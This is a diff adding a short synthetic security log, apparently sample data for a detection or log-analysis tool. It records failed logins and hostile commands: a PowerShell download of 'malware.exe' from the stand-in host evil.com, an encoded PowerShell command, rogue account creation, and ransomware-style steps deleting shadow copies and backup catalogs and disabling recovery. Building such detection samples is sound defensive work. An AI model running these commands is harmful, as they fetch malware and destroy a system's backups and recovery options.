@@ -1,0 +1,19 @@
+2026-06-01 09:10:21 INFO User John logged in from 192.168.1.10
+2026-06-01 09:11:00 FAILED LOGIN User John from 192.168.1.10
+2026-06-01 09:11:20 FAILED LOGIN User John from 192.168.1.10
+2026-06-01 09:11:40 FAILED LOGIN User John from 192.168.1.10
+2026-06-01 09:12:00 FAILED LOGIN User Alex from 192.168.1.20
+2026-06-01 09:13:00 FAILED LOGIN User Alex from 192.168.1.20
+2026-06-01 09:15:00 powershell.exe Invoke-WebRequest http://evil.com/malware.exe
+2026-06-01 09:16:00 powershell.exe -EncodedCommand aGVsbG8=
+2026-06-01 09:20:00 User hacker created
+2026-06-01 09:21:00 net user attacker /add
+2026-06-01 09:22:00 useradd admin
+2026-06-01 09:25:00 vssadmin delete shadows
+2026-06-01 09:26:00 cipher.exe /w:C
+2026-06-01 09:27:00 wbadmin delete catalog
+2026-06-01 09:28:00 bcdedit /set recoveryenabled no
+2026-06-01 EventID:4625 Failed Login User John
+2026-06-01 EventID:4688 powershell.exe
+2026-06-01 EventID:4720 User hacker created
+2026-06-01 EventID:4672 Administrator privileges assigned
